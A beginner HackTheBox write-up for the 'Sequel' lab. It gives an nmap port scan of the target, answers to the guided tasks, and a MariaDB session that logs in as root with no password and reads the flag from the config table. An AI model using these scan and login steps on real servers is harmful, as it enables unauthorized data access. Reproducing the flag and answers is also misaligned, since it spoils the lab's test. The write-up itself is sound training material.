TITLE: Sequel
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/Sequel.png
---

# Start
> at first i did an nmap scan that result of this
`
i didnt want to wast time on on so i did a fast scan of all ports ander 10000
because they said During our scan, which port do we find serving MySQL?
its 3306 by default.

➜  Sequel nmap --min-rate 5000 -T4 -Pn -p 0-9999 10.129.140.232  -o nmap_scan -v 
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-07 15:40 +0000
Initiating Parallel DNS resolution of 1 host. at 15:40
Completed Parallel DNS resolution of 1 host. at 15:40, 0.50s elapsed
Initiating SYN Stealth Scan at 15:40
Scanning 10.129.140.232 [10000 ports]
Discovered open port 3306/tcp on 10.129.140.232
Completed SYN Stealth Scan at 15:40, 2.07s elapsed (10000 total ports)
Nmap scan report for 10.129.140.232
Host is up (0.057s latency).
Not shown: 9999 closed tcp ports (reset)
PORT     STATE SERVICE
3306/tcp open  mysql

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
           Raw packets sent: 10033 (441.452KB) | Rcvd: 10000 (400.004KB)

`

## Tasks


1. During our scan, which port do we find serving MySQL?
`
3306
`

2. What community-developed MySQL version is the target running?
`
MariaDB
`

3. When using the MySQL command line client, what switch do we need to use in order to specify a login username?
`
-u
`

4. Which username allows us to log into this MariaDB instance without providing a password?
`
root
`

5. In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
`
*
`

6. In SQL, what symbol do we need to end each query with?
`
;
`

7. There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
`
htb
`

8. What is the command in MySQL to select a database to interact with?
`
use
`

9. What is the command in MySQL to show the different columns for a given table?
`
describe
`

10. Which table has a column named "flag"?
`
config
`

11. Submit root flag
`
to get the flag u will need to a connect to database using

➜  Sequel mysql -h 10.129.140.232 -u root --skip-ssl
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+

MariaDB [(none)]> use htb
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.059 sec)
MariaDB [htb]> describe config
    -> ;
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| name  | text                | YES  |     | NULL    |                |
| value | text                | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
3 rows in set (0.057 sec)

MariaDB [htb]> 
MariaDB [htb]> select * from config
    -> ;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.056 sec)

MariaDB [htb]> 


7b4bec00d1a39e3dd4e021ec3d915da8
`
